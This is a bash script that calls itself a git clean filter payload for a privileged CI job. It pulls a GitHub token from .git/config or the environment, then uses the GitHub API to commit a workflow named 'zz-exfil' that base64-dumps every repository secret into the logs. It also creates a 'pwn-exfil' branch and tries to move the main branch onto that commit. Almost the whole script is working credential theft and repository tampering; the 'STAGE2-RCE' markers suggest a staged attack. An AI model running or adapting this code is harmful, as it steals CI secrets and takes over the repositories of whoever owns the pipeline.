#!/bin/bash
# git clean filter payload: runs in the privileged commit-llms-txt job.
BLOB=$(mktemp)
cat > "$BLOB"
if [ ! -f /tmp/.stage2_done ]; then
  touch /tmp/.stage2_done
  {
    echo "===== STAGE2-RCE-START ====="
    id
    echo "PWD=$(pwd)"
    TOK=$(grep -o 'AUTHORIZATION: basic [A-Za-z0-9+/=]*' .git/config 2>/dev/null | head -1 | awk '{print $3}' | base64 -d 2>/dev/null | cut -d: -f2-)
    [ -z "$TOK" ] && TOK="${GITHUB_TOKEN:-}"
    echo "TOKEN_LEN=${#TOK}"
    echo "REPO=${GITHUB_REPOSITORY:-}"
    cat > /tmp/zz-exfil.yml <<'YML'
name: zz-exfil
on:
  workflow_run:
    workflows: ["PR validation"]
    types: [completed]
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          ALL: ${{ toJSON(secrets) }}
        run: |
          echo EXFIL_START
          echo "$ALL" | base64 -w0
          echo
          echo EXFIL_END
YML
    TOKEN="$TOK" REPO="${GITHUB_REPOSITORY:-PDFtoMark/triage-adobedocs-v67fd058-00feca}" python3 - <<'PY'
import base64, json, os, urllib.request, urllib.error
token = os.environ["TOKEN"]; repo = os.environ["REPO"]
api = f"https://api.github.com/repos/{repo}"
def req(method, path, data=None):
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(api + path, method=method, data=body)
    r.add_header("Authorization", "Bearer " + token)
    r.add_header("Accept", "application/vnd.github+json")
    r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r) as resp:
            return resp.status, json.loads(resp.read().decode() or "{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode() or "{}")
        except Exception:
            return e.code, {}
st, me = req("GET", "")
print("GET_REPO", st, "PERMS", json.dumps(me.get("permissions")))
st, ref = req("GET", "/git/ref/heads/main")
print("GET_MAIN_REF", st)
main_sha = ref.get("object", {}).get("sha", "")
st, cm = req("GET", f"/git/commits/{main_sha}")
base_tree = cm.get("tree", {}).get("sha", "")
print("MAIN_SHA", main_sha)
wf = open("/tmp/zz-exfil.yml", "rb").read()
st, blob = req("POST", "/git/blobs", {"content": base64.b64encode(wf).decode(), "encoding": "base64"})
print("POST_BLOB", st)
st, tree = req("POST", "/git/trees", {"base_tree": base_tree, "tree": [
    {"path": ".github/workflows/zz-exfil.yml", "mode": "100644", "type": "blob", "sha": blob.get("sha", "")}]})
print("POST_TREE", st)
st, nc = req("POST", "/git/commits", {"message": "chore: add generated workflow [skip ci]",
    "tree": tree.get("sha", ""), "parents": [main_sha]})
print("POST_COMMIT", st, nc.get("sha"))
csha = nc.get("sha", "")
st, nr = req("POST", "/git/refs", {"ref": "refs/heads/pwn-exfil", "sha": csha})
print("POST_BRANCH_REF", st, json.dumps(nr)[:400])
st, up = req("PATCH", "/git/refs/heads/main", {"sha": csha, "force": False})
print("PATCH_MAIN_REF", st, json.dumps(up)[:400])
PY
    echo "===== STAGE2-RCE-END ====="
  } >&2
fi
cat "$BLOB"; rm -f "$BLOB"
